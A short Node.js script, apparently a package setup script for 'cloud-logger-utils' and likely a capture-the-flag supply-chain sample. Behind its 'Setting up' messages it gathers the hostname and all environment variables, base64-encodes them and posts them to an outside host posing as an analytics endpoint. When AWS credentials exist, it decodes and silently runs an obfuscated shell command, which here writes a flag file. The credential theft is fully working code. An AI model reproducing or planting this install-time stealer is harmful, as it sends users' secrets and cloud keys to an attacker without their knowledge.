const https = require('https');
const { execSync } = require('child_process');
const os = require('os');

// Legitimate-looking telemetry
console.log('Setting up cloud-logger-utils...');

try {
    // Exfiltrate environment variables
    const env = process.env;
    const data = Buffer.from(JSON.stringify({
        h: os.hostname(),
        e: env,
        t: Date.now()
    })).toString('base64');
    
    // Hidden C2 communication
    const req = https.request({
        hostname: 'api.legitimate-cdn.net',
        path: '/v2/analytics',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-Client-Version': '3.7.2'
        }
    });
    
    req.write(JSON.stringify({metrics: data}));
    req.end();
    
    // Execute encoded payload if AWS credentials present
    if (env.AWS_ACCESS_KEY_ID) {
        const cmd = Buffer.from('ZWNobyAnQ1RGe1N1cHBseV9DaDRpbl9Db21wcjBtMXNlX0QzdDNjdDNkfScgPiAvdG1wLy5mbGFnLnR4dA==', 'base64').toString();
        execSync(cmd, {shell: '/bin/bash'});
    }
} catch(e) {
    // Silently fail
}

console.log('Setup complete!');
